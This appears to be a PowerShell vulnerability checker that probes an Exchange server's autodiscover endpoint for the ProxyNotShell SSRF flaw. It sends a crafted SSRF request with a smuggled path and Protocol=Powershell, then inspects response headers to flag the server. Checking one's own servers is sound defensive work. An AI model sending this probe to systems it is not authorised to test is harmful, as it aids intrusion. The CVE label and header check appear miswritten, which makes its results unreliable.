$target = "mail.local"
$checkdns = Resolve-DnsName $target -ErrorAction SilentlyContinue

if($checkdns){
Write-host "Running autodiscover test..." -ForegroundColor Cyan
try
{
$webtest1 = Invoke-WebRequest -uri "https://$target/autodiscover"
}
catch
{
Write-Host $_.ErrorDetails.Message;
$Failure = $_.Exception.Response
$Failure.Headers.tostring()
}



Write-host "Running autodiscover SSRF test..." -ForegroundColor Cyan
try
{
write-host "testing site..." -ForegroundColor Gray
$webtest2 = invoke-webrequest -uri "https://$target/autodiscover/autodiscover.json?scanner4329@pwnstar.local/owa/&Email=autodiscover/autodiscover.json?b@small.local&Protocol=HACKER&Protocol=Powershell"
}
catch
{
    write-host "Caught" -ForegroundColor Red
    $Failure = $_.Exception.Response
    $Failure.Headers.tostring()
    $Failure.Headers.tostring() | findstr /I "X-OWA-Version"
    $Failure.Headers.tostring() | findstr /I "X-FEServer"
    if($Failure.Headers -contains "X-FEServer")
        {
        write-host "Poentially vulnerable to CVE-2022-40140 & CVE-2022-41082" -ForegroundColor Red
        }
}


    if($webtest2.StatusCode -eq 200)
    {
    write-host "Authenticated to Server" -ForegroundColor Green
    if($webtest2.Headers.Keys -contains "X-FEServer")
            {
            write-host "Poentially vulnerable to CVE-2022-40140 & CVE-2022-41082" -ForegroundColor Red
            }
        }

}
else
{
write-host "DNS does not resolve" -ForegroundColor Red
}
